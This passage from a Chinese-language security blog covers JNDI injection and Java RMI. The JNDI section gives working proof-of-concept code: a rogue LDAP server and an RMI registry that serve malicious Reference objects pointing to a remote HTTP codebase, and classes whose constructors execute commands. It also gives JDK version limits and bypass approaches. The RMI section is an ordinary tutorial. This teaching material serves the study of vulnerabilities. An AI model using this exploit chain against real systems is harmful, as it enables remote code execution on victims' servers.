指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。 Changelog: JDK 6u45 https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html JDK 7u21 http://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html LDAP攻击向量通过LDAP攻击向量来利用JNDI注入的原理和RMI攻击向量是一样的，区别只是换了个媒介而已，下面就只列下LDAP+Reference的利用技巧，至于JNDI注入漏洞点和前面是一样的就不再赘述了。 LDAP+Reference利用技巧除了RMI服务之外，JNDI还可以对接LDAP服务，且LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址如ldap://xxx/xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。 注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制。 所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，我们就可以利用LDAP+Reference的技巧来进行JNDI注入的利用。 因此，这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下。下面的示例代码中我本地的Jdk版本是1.8.0_73。 LdapServer.java，LDAP服务，需要导入unboundid-ldapsdk.jar包： maven-pom.xml： 1234567&lt;!-- https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk --&gt; &lt;dependency&gt; &lt;groupId&gt;com.unboundid&lt;/groupId&gt; &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt; &lt;version&gt;3.1.1&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081public class LdapServer &#123; private static final String LDAP_BASE = \"dc=example,dc=com\"; public static void main (String[] args) &#123; String url = \"http://127.0.0.1:8080/#EvilObject2\"; int port = 1234; try &#123; InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \"listen\", InetAddress.getByName(\"0.0.0.0\"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\"Listening on 0.0.0.0:\" + port); ds.startListening(); &#125; catch ( Exception e ) &#123; e.printStackTrace(); &#125; &#125; private static class OperationInterceptor extends InMemoryOperationInterceptor &#123; private URL codebase; /** * */ public OperationInterceptor ( URL cb ) &#123; this.codebase = cb; &#125; /** * &#123;@inheritDoc&#125; * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult) */ @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123; String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try &#123; sendResult(result, base, e); &#125; catch ( Exception e1 ) &#123; e1.printStackTrace(); &#125; &#125; protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123; URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\")); System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl); e.addAttribute(\"javaClassName\", \"Exploit\"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf('#'); if ( refPos &gt; 0 ) &#123; cbstring = cbstring.substring(0, refPos); &#125; e.addAttribute(\"javaCodeBase\", cbstring); e.addAttribute(\"objectClass\", \"javaNamingReference\"); e.addAttribute(\"javaFactory\", this.codebase.getRef()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); &#125; &#125;&#125; LdapClient.java，LDAP客户端： 1234567891011121314public class LdapClient &#123; public static void main(String[] args) throws Exception&#123; try &#123; Context ctx = new InitialContext(); ctx.lookup(\"ldap://localhost:1234/EvilObject2\"); String data = \"This is LDAP Client.\"; //System.out.println(serv.service(data)); &#125; catch (NamingException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125;&#125; EvilObject.java，恶意类，执行弹出计算器： 12345public class EvilObject2 &#123; public EvilObject2() throws Exception &#123; Runtime.getRuntime().exec(\"/Applications/Calculator.app/Contents/MacOS/Calculator\"); &#125;&#125; 运行结果： JNDI利用链分析这里写一个小PoC，跟进去看看利用链。 客户端，受害者： 123456789public class Client &#123; public static void main(String[] args) throws Exception &#123; String uri = \"rmi://127.0.0.1:1099/aa\"; Context ctx = new InitialContext(); ctx.lookup(uri); &#125;&#125; 服务端，攻击者部署： 1234567891011public class Server &#123; public static void main(String args[]) throws Exception &#123; Registry registry = LocateRegistry.createRegistry(1099); Reference aa = new Reference(\"ExecTest\", \"ExecTest\", \"http://127.0.0.1:8081/\"); ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa); System.out.println(\"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'\"); registry.bind(\"aa\", refObjWrapper); &#125;&#125; 恶意类，干坏事的： 12345678910111213141516171819202122232425262728293031public class ExecTest &#123; public ExecTest() throws IOException,InterruptedException&#123; String cmd=\"pwd\"; final Process process = Runtime.getRuntime().exec(cmd); printMessage(process.getInputStream());; printMessage(process.getErrorStream()); int value=process.waitFor(); System.out.println(value); &#125; private static void printMessage(final InputStream input) &#123; // TODO Auto-generated method stub new Thread (new Runnable() &#123; @Override public void run() &#123; // TODO Auto-generated method stub Reader reader =new InputStreamReader(input); BufferedReader bf = new BufferedReader(reader); String line = null; try &#123; while ((line=bf.readLine())!=null) &#123; System.out.println(line); &#125; &#125;catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; &#125;).start(); &#125;&#125; 攻击截图： 把ExecTest.java及其编译的文件放到其他目录下，不然会在当前目录中直接找到这个类。不起web服务也会命令执行成功。ExecTest.java文件不能申明包名，即package xxx。声明后编译的class文件函数名称会加上包名从而不匹配。java版本小于1.8u191。之后版本存在trustCodebaseURL的限制，只信任已有的codebase地址，不再能够从指定codebase中下载字节码。 分析调用流程整体调用链如下： 第一个函数，InitialContext.lookup函数: 12345public Object lookup(String name) throws NamingException &#123; //getURLOrDefaultInitCtx函数会分析name的协议头返回对应协议的环境对象，此处返回Context对象的子类rmiURLContext对象 //然后在对应协议中去lookup搜索，我们进入lookup函数 return getURLOrDefaultInitCtx(name).lookup(name); &#125; 第二个，GenericURLContext.lookup函数： 1234567891011121314151617//var1=\"rmi://127.0.0.1:1099/aa\"public Object lookup(String var1) throws NamingException &#123; //此处this为rmiURLContext类调用对应类的getRootURLContext类为解析RMI地址 //不同协议调用这个函数，根据之前getURLOrDefaultInitCtx(name)返回对象的类型不同，执行不同的getRootURLContext //进入不同的协议路线 ResolveResult var2 = this.getRootURLContext(var1, this.myEnv);//获取RMI注册中心相关数据 Context var3 = (Context)var2.getResolvedObj();//获取注册中心对象 Object var4; try &#123; var4 = var3.lookup(var2.getRemainingName());//去注册中心调用lookup查找，我们进入此处，传入name-aa &#125; finally &#123; var3.close(); &#125; return var4;&#125; 这里再提一下getRootURLContext函数，可以看到他对不同的JNDI协议配置了不同的解析函数（查看实现：option+command+B）。 第三个函数，RegistryContext.lookup： 1234567891011121314151617//传入var1=aapublic Object lookup(Name var1) throws NamingException &#123; if (var1.isEmpty()) &#123; return new RegistryContext(this); &#125; else &#123;//判断来到这里 Remote var2; try &#123; var2 = this.registry.lookup(var1.get(0));//RMI客户端与注册中心通讯，返回RMI服务IP，地址等信息 &#125; catch (NotBoundException var4) &#123; throw new NameNotFoundException(var1.get(0)); &#125; catch (RemoteException var5) &#123; throw (NamingException)wrapRemoteException(var5).fillInStackTrace(); &#125; return this.decodeObject(var2, var1.getPrefix(1));//我们进入此处 &#125;&#125; 第四个函数，decodeObject： 先说一下怎么进入，直接下断点，直接执行到cursor，这里需要等待一会，然后直接进入看源码： 12345678910111213141516171819private Object decodeObject(Remote var1, Name var2) throws NamingException &#123; try &#123; //注意到上面的服务端代码，我们在RMI服务端绑定的是一个Reference对象，世界线在这里变动 //如果是Reference对象会，进入var.getReference()，与RMI服务器进行一次连接，获取到远程class文件地址。 //如果是普通RMI对象服务，这里不会进行连接，只有在正式远程函数调用的时候才会连接RMI服务。 Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1; return NamingManager.getObjectInstance(var3, var2, this, this.environment); //获取reference对象进入此处 &#125; catch (NamingException var5) &#123; throw var5; &#125; catch (RemoteException var6) &#123; throw (NamingException)wrapRemoteException(var6).fillInStackTrace(); &#125; catch (Exception var7) &#123; NamingException var4 = new NamingException(); var4.setRootCause(var7); throw var4; &#125; &#125;&#125; 进入到这个函数之后继续跑： 第五个函数，继续跟进去，NamingManager： 12345678910111213141516171819202122232425262728293031323334353637383940//传入Reference对象,也就是var3到refinfopublic static Object getObjectInstance(Object refInfo, Name name, Context nameCtx, Hashtable&lt;?,?&gt; environment) throws Exception&#123; // Use builder if installed ... // Use reference if possible Reference ref = null; if (refInfo instanceof Reference) &#123;//满足 ref = (Reference) refInfo;//复制 &#125; else if (refInfo instanceof Referenceable) &#123;//不进入 ref = ((Referenceable)(refInfo)).getReference(); &#125; Object answer; if (ref != null) &#123;//进入此处 String f = ref.getFactoryClassName();//函数名 ExecTest if (f != null) &#123; //任意命令执行点1（构造函数、静态代码），进入此处 factory = getObjectFactoryFromReference(ref, f); if (factory != null) &#123; //任意命令执行点2（覆写getObjectInstance）， return factory.getObjectInstance(ref, name, nameCtx, environment); &#125; return refInfo; &#125; else &#123; // if reference has no factory, check for addresses // containing URLs answer = processURLAddrs(ref, name, nameCtx, environment); if (answer != null) &#123; return answer; &#125; &#125; &#125; 第六个函数，getObjectFactoryFromReference： 12345678910111213141516171819202122232425262728static ObjectFactory getObjectFactoryFromReference( Reference ref, String factoryName) throws IllegalAccessException, InstantiationException, MalformedURLException &#123; Class clas = null; //尝试从本地获取该class try &#123; clas = helper.loadClass(factoryName); &#125; catch (ClassNotFoundException e) &#123; // ignore and continue // e.printStackTrace(); &#125; //如果不在本地classpath，从cosebase中获取class String codebase; if (clas == null &amp;&amp; (codebase = ref.getFactoryClassLocation()) != null) &#123; //此处codebase是我们在恶意RMI服务端中定义的http://127.0.0.1:8081/ try &#123; //从我们放置恶意class文件的web服务器中获取class文件 clas = helper.loadClass(factoryName, codebase); &#125; catch (ClassNotFoundException e) &#123; &#125; &#125; //实例化我们的恶意class文件 return (clas != null) ? (ObjectFactory) clas.newInstance() : null;&#125; 实例化会默认调用构造方法、静态代码块。上面的例子就是调用了构造方法完成任意代码执行。 但是可以注意到之前执行任意命令成功，但是报错退出了，我们修改我们的恶意class文件，换一个命令执行点factory.getObjectInstance复写该函数执行命令。 报错是因为我们的类在实例化后不能转化为ObjectFactory(ObjectFactory) clas.newInstance()。只需要我们的类继承该类即可。 根据ObjectFactory.java的getObjectInstance接口复写函数 123public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?,?&gt; environment) throws Exception; 版本限制JDNI注入由于其加载动态类原理是JNDI Reference远程加载Object Factory类的特性（使用的不是RMI Class Loading,而是URLClassLoader）。 所以不受RMI动态加载恶意类的 java版本应低于7u21、6u45，或者需要设置java.rmi.server.useCodebaseOnly=false系统属性的限制。具有更多的利用空间 但还是有版本无法复现，是因为在JDK 6u132, JDK 7u122, JDK 8u113版本中，系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。（这也是1.8u191失败的原因） 之前也提到jndi注入远程对象读取不单单只可以从rmi服务中读取，还可以从LDAP服务中读取 LDAP服务的Reference远程加载Factory类不受com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。 不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，在Oracle JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false。 绕过JDK 8u191+等高版本限制对于Oracle JDK 11.0.1、8u191、7u201、6u211或者更高版本的JDK来说，默认环境下之前这些利用方式都已经失效。然而，依然可以进行绕过并完成利用。两种绕过方法如下： 找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。 利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。 这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击，当然之后会新起一篇再说。 总结以上就是总结JNDI的利用组合，其实个人觉得JNDI，RMI，LDAP都很像。 参考博客","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"JNDI","slug":"JNDI","permalink":"https://0range228.github.io/tags/JNDI/"}]},{"title":"Java RMI原理及实战","slug":"Java-RMI原理及实战","date":"2020-06-25T05:52:31.000Z","updated":"2021-07-29T14:18:14.211Z","comments":true,"path":"Java-RMI原理及实战/","link":"","permalink":"https://0range228.github.io/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/","excerpt":"序言 遥知兄弟登高处，遍插茱萸少一人。 前一阵总结反序列化漏洞，发现RMI作为跳板，该角色必不可少。","text":"序言 遥知兄弟登高处，遍插茱萸少一人。 前一阵总结反序列化漏洞，发现RMI作为跳板，该角色必不可少。 RMI概念简述RMI（Remote Method Invocation）即远程方法调用，是分布式编程中的一个基本思想。实现远程方法调用的技术有很多，比如CORBA、WebService，提到的这两种都是独立于编程语言的。 Java RMI是专为Java环境设计的远程方法调用机制，是一种用于实现远程调用（RPC，Remote Procedure Call）的一组Java API，能直接传输序列化后的Java对象和分布式垃圾收集。它的实现依赖于JVM，支持从一个JVM到另一个JVM的调用。 在Java RMI中： 远程服务器实现具体的Java方法并提供接口 客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法 其中对象是通过序列化方式进行编码传输的 RMI全部的宗旨就是尽可能简化远程接口对象的使用 平时说的反序列化漏洞的利用经常涉及到RMI，就是这个意思。 RMI依赖的通信协议为JRMP（Java Remote Message Protocol，Java远程消息交换协议），该协议是为Java定制的，JRMP协议运行在Java RMI下、TCP/IP层之上的一种协议，要求服务端与客户端都必须是Java编写的。 Java RMI极大地依赖于接口。在需要创建一个远程对象的时候，程序员通过传递一个接口来隐藏底层的实现细节。客户端得到的远程对象句柄正好与本地的根代码连接，由后者负责透过网络通信。这样一来，程序员只需关心如何通过自己的接口句柄发送消息。 多说两句： Java本身对RMI规范的实现默认使用的是JRMP协议，而Weblogic对RMI规范的实现使用T3协议，Weblogic之所以开发T3协议，是因为他们需要可扩展、高效的协议来使用Java构建企业级的分布式对象系统。 众所周知，一般情况下Java方法调用指的是同一个JVM内部方法的调用，而RMI与之恰恰相反。 到这里，做个简短通俗的总结：RMI是一种行为，这种行为指的是Java远程方法调用，调用的是方法。 RMI能够帮助我们查找并执行远程对象的方法。通俗地说，远程调用就像A主机存放一个Class文件，然后在B机器中调用这个Class的方法。 Java RMI，跨JVM，是允许运行在JVM内部的一个对象调用运行在另一个JVM内部的对象的方法。 这两个JVM可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。 RMI和序列化的缘分RMI的传输是基于序列化机制的。 如果一个RMI接口的参数类型为一个对象，那么我们客户端就可以发送一个自己构建的对象，来让服务端将这个对象反序列化出来。当然，前提是服务端的classpath里面有合适的类，或者后续恶意类加载也可以。 RMI代理模式设计模式RMI的设计模式中，主要包括以下三个部分的角色： Registry：提供服务注册与服务获取。即Server端向Registry注册服务，比如地址、端口等一些信息，Client端从Registry获取远程对象的一些信息，如地址、端口等，然后进行远程调用。 Server：服务端，远程方法的提供者，并向Registry注册自身提供的服务 Client：客户端，远程方法的消费者，从Registry获取远程方法的相关信息并且调用 交互过程一般习惯，注册中心和服务端都在一起，RMI交互过程如图所示： RMI由3个部分构成： RMI Registry（JDK提供的一个可以独立运行的程序，在bin目录下） 第二个是Server端的程序，对外提供远程对象 第三个是Client端的程序，想要调用远程对象的方法。 在设计模式中，3个角色的交互过程可简单概述为： 服务端创建远程对象，Skeleton侦听一个随机的端口x，这个端口是用来进行远程通信服务的，以供客户端调用。 启动RMI Registry服务，启动时可以指定服务监听的端口，也可以使用默认的端口（1099）。 Server端在本地先实例化一个提供服务的实现类，然后通过RMI提供的Naming/Context/Registry等类的bind或rebind方法将刚才实例化好的实现类注册到RMI Registry上并对外暴露一个名称Name； 客户端对RMI Registry发起请求，根据提供的Name从RMI Registry得到Stub。Stub中包含与Skeleton通信的信息（地址，端口等），两者建立通信，Stub作为客户端代理请求服务端代理Skeleton并进行远程方法调用。 客户端Stub调用远程方法，调用结果先返回给Skeleton，Skeleton再返回给客户端Stub，Stub再返回给客户端本身。 多说一句，一般我们知道RMI Registry的端口(1099)就可以了。 通信端口会包含在Stub中，Stub是RMI Registry给Client分发的。 此外，我们可以看到，从逻辑上来看数据是在Client和Server之间横向流动的，但是实际上是从Client到Stub，然后从Skeleton到Server这样纵向流动的。 通信过程 方法调用从客户端经存根（Stub）、远程引用层（Remote Reference Layer）和传输层（Transport Layer）向下，传递给主机，然后再次经传输层，向上穿过远程调用层和骨干网（Skeleton），到达服务器对象。 存根Stub位于客户端，扮演着远程服务器对象的代理，使该对象可被客户激活。远程引用层处理语义、管理单一或多重对象的通信，决定调用是应发往一个服务器还是多个。 传输层管理实际的连接，并且追踪可以接受方法调用的远程对象。Skeleton完成对服务器对象实际的方法调用，并获取返回值。返回值向下经远程引用层、服务器端的传输层传递回客户端，再向上经传输层和远程调用层返回。最后，存根Stub获得返回值。 总结： Stub：扮演着远程服务器对象的代理的角色，使该对象可被客户激活。 远程引用层：处理语义、管理单一或多重对象的通信，决定调用是应发往一个服务器还是多个。 传输层：管理实际的连接，并且追踪可以接受方法调用的远程对象。 Skeleton：完成对服务器对象实际的方法调用，并获取返回值。 返回值向下经远程引用层、服务器端的传输层传递回客户端，再向上经传输层和远程调用层返回。最后，存根获得返回值。 Stub和SkeletonRMI的客户端和服务器并不直接通信，客户与远程对象之间采用的代理方式进行Socket通信。为远程对象分别生成了客户端代理和服务端代理，其中位于客户端的代理类称为Stub即存根（包含服务器Skeleton信息），位于服务端的代理类称为Skeleton即骨干网。 RMI RegistryRMI注册表，默认监听在1099端口上，Client通过Name向RMI Registry查询，得到这个绑定关系和对应的Stub。 远程对象在RMI中的核心就是远程对象，一切都是围绕这个东西来进行的。 顾名思义，远程对象存在于服务端，以供客户端调用。 任何可以被远程调用的对象都必须实现 java.rmi.Remote 接口，远程对象的实现类必须继承UnicastRemoteObject类。 如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，并且在远程对象的构造方法中调用UnicastRemoteObject.exportObject()静态方法。 这个远程对象中可能有很多个函数，但是只有在远程接口中声明的函数才能被远程调用，其他的公共函数只能在本地的JVM中使用。 序列化传输数据客户端远程调用时传递给服务器的参数，服务器执行后传递给客户端的返回值。参数或者返回值，在传输时候会被序列化，在被接受时会被反序列化。 因此这些传输的对象必须可以被序列化，相应的类必须实现java.io.Serializable接口，并且客户端的serialVersionUID字段要与服务器端保持一致。 工厂模式 如图，先假设： 有两个远程服务接口可供Client调用，Factory和Product接口 FactoryImpl类实现了Factory接口，ProductImpl类实现了Product接口 工厂模式的处理流程为： FactoryImpl被注册到了RMI Registry中； Client端请求一个Factory的引用； RMI Registry返回Client端一个FactoryImpl的引用； Client端调用FactoryImpl的远程方法请求一个ProductImpl的远程引用； FactoryImpl返回给Client端一个ProductImpl引用； Client通过ProductImpl引用调用远程方法； 可以看到，客户端向RMI Registry请求获取到指定的FactoryImpl的引用后，再通过调用FactoryImpl的远程方法请求一个ProductImpl的远程引用，从而调用到ProductImpl引用指向的远程方法。 上面提到的创建FactoryImpl对象，设置FactoryImpl对象的指向ProductImp（通过HTTP等协议定位，可以位于其他服务器），具有指向功能的对象也可以叫做reference对象。 这种RMI+Reference的技术在JNDI注入中是单独作为一种利用方式。 这里执行远程对象的方法的是RMI通讯的客户端，为攻击客户端的方式，是在具体的代码和利用场景可以参考FastJson中的JNDI注入。 java.rmi包简介Remote一个接口interface，这个interface中没有声明任何方法。只有定义在“remote interface”，即继承了Remote的接口中的方法，才可以被远程调用。 RemoteExceptionRemoteException是所有在远程调用中所抛出异常的超类，所有能够被远程调用的方法声明，都需要抛出此异常。 Naming提供向RMI Registry保存远程对象引用或者从RMI Registry获取远程对象引用的方法。这个类中的方法都是静态方法，每一个方法都包含了一个类型为String的name参数, 这个参数是URL格式，形如://host:port/name。 Registry一个interface, 其功能和Naming类似，每个方法都有一个String类型的name参数，但是这个name不是URL格式，是远程对象的一个命名。Registry的实例可以通过方法LocateRegistry.getRegistry()获得。 LocateRegistry用于获取到RMI Registry的一个连接，这个连接可以用于获取一个远程对象的引用。也可以创建一个注册中心。 RemoteObject重新覆写了Object对象中的equals,hashCode,toString方法，从而可以用于远程调用。 UnicastRemoteObject用于获得一个stub。这个stub封装了底层细节，用于和远程对象进行通信。 Unreferenced一个interface, 声明了方法：void unreferenced()。如果一个远程对象实现了此接口，则这个远程对象在没有任何客户端引用的时候，这个方法会被调用。 RMI动态类加载RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的class文件。如果需要客户端正确调用这些子类中被重写的方法，则同样需要有运行时动态加载额外类的能力。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。 在之后的JNDI注入和反序列化漏洞的利用中，正是涉及到了RMI动态类加载。 编写RMI的步骤定义服务端供远程调用的类在此之前先定义一个可序列化的Model层的用户类，其实例可放置于服务端进行远程调用： 12345678910111213141516171819202122232425262728293031import java.io.Serializable;public class PersonEntity implements Serializable &#123; private int id; private String name; private int age; public void setId(int id) &#123; this.id = id; &#125; public int getId() &#123; return id; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void setAge(int age) &#123; this.age = age; &#125; public int getAge() &#123; return age; &#125;&#125; 定义一个远程接口远程接口必须继承java.rmi.Remote接口，且抛出RemoteException错误： 1234567import java.rmi.Remote;import java.rmi.RemoteException;import java.util.List;public interface PersonService extends Remote &#123; public List&lt;PersonEntity&gt; GetList() throws RemoteException;&#125; 开发接口的实现类建立PersonServiceImpl实现远程接口，注意此为远程对象实现类，需要继承UnicastRemoteObject（如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法）： 123456789101112131415161718192021222324252627public class PersonServiceImpl extends UnicastRemoteObject implements PersonService &#123; protected PersonServiceImpl() throws RemoteException &#123; // TODO Auto-generated constructor stub super(); &#125; @Override public List&lt;PersonEntity&gt; GetList() throws RemoteException &#123; // TODO Auto-generated method stub System.out.println(\"Get Person Start!\"); List&lt;PersonEntity&gt; personList = new LinkedList&lt;PersonEntity&gt;(); PersonEntity person1 = new PersonEntity(); person1.setAge(3); person1.setId(0); person1.setName(\"0range\"); personList.add(person1); PersonEntity person2 = new PersonEntity(); person2.setAge(18); person2.setId(1); person2.setName(\"Wind\"); personList.add(person2); return personList; &#125;&#125; 创建Server和Registry其实Server和Registry可以单独运行创建，其中Registry可通过代码启动也可通过rmiregistry命令启动，这里只进行简单的演示，将Server和Registry的创建、对象绑定注册表等都写到一块，且Registry直接代码启动： 123456789101112131415161718import java.rmi.Naming;import java.rmi.registry.LocateRegistry;public class Program &#123; public static void main(String[] args) &#123; try &#123; PersonService personService=new PersonServiceImpl(); //注册通讯端口 LocateRegistry.createRegistry(9898); //注册通讯路径 Naming.rebind(\"rmi://127.0.0.1:9898/PersonService\", personService); System.out.println(\"Service Start!\"); &#125; catch (Exception e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125;&#125; 创建客户端并查找调用远程方法这里我们通过Naming.lookup()来查找RMI Server端的远程对象并获取到本地客户端环境中输出出来： 1234567891011121314151617import java.rmi.Naming;import java.util.List;public class Client &#123; public static void main(String[] args)&#123; try&#123; //调用远程对象，注意RMI路径与接口必须与服务器配置一致 PersonService personService=(PersonService) Naming.lookup(\"rmi://127.0.0.1:9898/PersonService\"); List&lt;PersonEntity&gt; personList=personService.GetList(); for(PersonEntity person:personList)&#123; System.out.println(\"ID:\"+person.getId()+\" Age:\"+person.getAge()+\" Name:\"+person.getName()); &#125; &#125;catch(Exception ex)&#123; ex.printStackTrace(); &#125; &#125;&#125; 最后，我们看下模拟运行的场景。 先启动Server和Register，开启成功后显示“Server Start!”，然后运行Client程序，可以看到客户端成功获取到了在Register注册的Server中的远程对象的内容： 几个函数这里小结下几个函数： bind(String name, Object obj)：注册对象，把对象和一个名字name绑定，这里的name其实就是URL格式。如果该名字已经与其他对象绑定，则抛出NameAlreadyBoundException错误； rebind(String name, Object obj)：注册对象，把对象和一个名字name绑定。如果改名字已经与其他对象绑定，不会抛出NameAlreadyBoundException错误，而是把当前参数obj指定的对象覆盖原先的对象（更暴力）； lookup(String name)：查找对象，返回与参数name指定的名字所绑定的对象； unbind(String name)：注销对象，取消对象与名字的绑定； 经典例子这里我再写一个例子，用于强化。 首先我还是生成一个接口，叫它IRemoteMath。 123456789101112131415import java.rmi.Remote;import java.rmi.RemoteException;/** * 必须继承Remote接口。 * 所有参数和返回类型必须序列化(因为要网络传输)。 * 任意远程对象都必须实现此接口。 * 只有远程接口中指定的方法可以被调用。 */public interface IRemoteMath extends Remote &#123; // 所有方法必须抛出RemoteException public double add(double a, double b) throws RemoteException; public double subtract(double a, double b) throws RemoteException;&#125; 注意： 这个远程接口必须继承Remote类； 内部抽象方法必须都有throw RemoteException 接下来我写一个接口的实现类，叫做RemoteMath。 1234567891011121314151617181920212223242526272829/** * 服务器端实现远程接口。 * 必须继承UnicastRemoteObject，以允许JVM创建远程的存根/代理。 */public class RemoteMath extends UnicastRemoteObject implements IRemoteMath &#123; private int numberOfComputations; protected RemoteMath() throws RemoteException &#123; numberOfComputations = 0; &#125; @Override public double add(double a, double b) throws RemoteException &#123; numberOfComputations++; System.out.println(\"Number of computations performed so far = \" + numberOfComputations); return (a+b); &#125; @Override public double subtract(double a, double b) throws RemoteException &#123; numberOfComputations++; System.out.println(\"Number of computations performed so far = \" + numberOfComputations); return (a-b); &#125;&#125; 注意： 这个类其实就是接口实现类 实现接口的全部方法，这个不必多说@override 必须继承UnicastRemoteObject 用它来实现接口中声明的所有抽象方法，它就是接口的实现类。 接下来是第一个关键角色Server，这里我是把Server和RMI Registry合在一起，实现如下： 123456789101112131415161718192021222324252627282930import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;/** * 创建RemoteMath类的实例并在rmiregistry中注册。 */public class RMIServer &#123; public static void main(String[] args) &#123; try &#123; // 注册远程对象,向客户端提供远程对象服务。 // 远程对象是在远程服务上创建的，你无法确切地知道远程服务器上的对象的名称， // 但是,将远程对象注册到RMI Registry之后, // 客户端就可以通过RMI Registry请求到该远程服务对象的stub， // 利用stub代理就可以访问远程服务对象了。 IRemoteMath remoteMath = new RemoteMath(); LocateRegistry.createRegistry(1099); Registry registry = LocateRegistry.getRegistry(); registry.bind(\"Compute\", remoteMath); System.out.println(\"Math server ready\"); // 如果不想再让该对象被继续调用，使用下面一行 // UnicastRemoteObject.unexportObject(remoteMath, false); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 注意： 在这里，首先接口=new 实现类，用到了Java多态，从这里开始也是用接口去注册，用接口去迎接； 接下来注册一个端口，默认是1099； 接下来将名字与接口实现类对象绑定，上面就是“Compute”和remoteMath 之后客户端就可以通过RMI Registry请求到该远程服务对象的stub了 客户端实现： 123456789101112131415161718192021public class MathClient &#123; public static void main(String[] args) &#123; try &#123; // 如果RMI Registry就在本地机器上，URL就是:rmi://localhost:1099/hello // 否则，URL就是：rmi://RMIService_IP:1099/hello //Registry registry = LocateRegistry.getRegistry(\"localhost\"); // 从Registry中检索远程对象的存根/代理 //IRemoteMath remoteMath = (IRemoteMath) registry.lookup(\"Compute\"); IRemoteMath remoteMath=(IRemoteMath) Naming.lookup(\"rmi://127.0.0.1:1099/Compute\"); // 调用远程对象的方法 double addResult = remoteMath.add(5.0, 3.0); System.out.println(\"5.0 + 3.0 = \" + addResult); double subResult = remoteMath.subtract(5.0, 3.0); System.out.println(\"5.0 - 3.0 = \" + subResult); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 注意： 首先Naming.lookup去寻找Compute服务，用接口去迎接，拿到远程对象 拿到远程对象之后，通过它去调用远程方法，实现整个流程 结果截图： 多说两句这里说明一下，当执行Registry registry = LocateRegistry.createRegistry(1099);的时候，返回的registry对象类是sun.rmi.registry.RegistryImpl，其内部的ref，也就是sun.rmi.server.UnicastServerRef，持有sun.rmi.registry.RegistryImpl_Skel类型的对象变量ref。 而服务端以及客户端，执行Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);返回的是sun.rmi.registry.RegistryImpl_Stub。 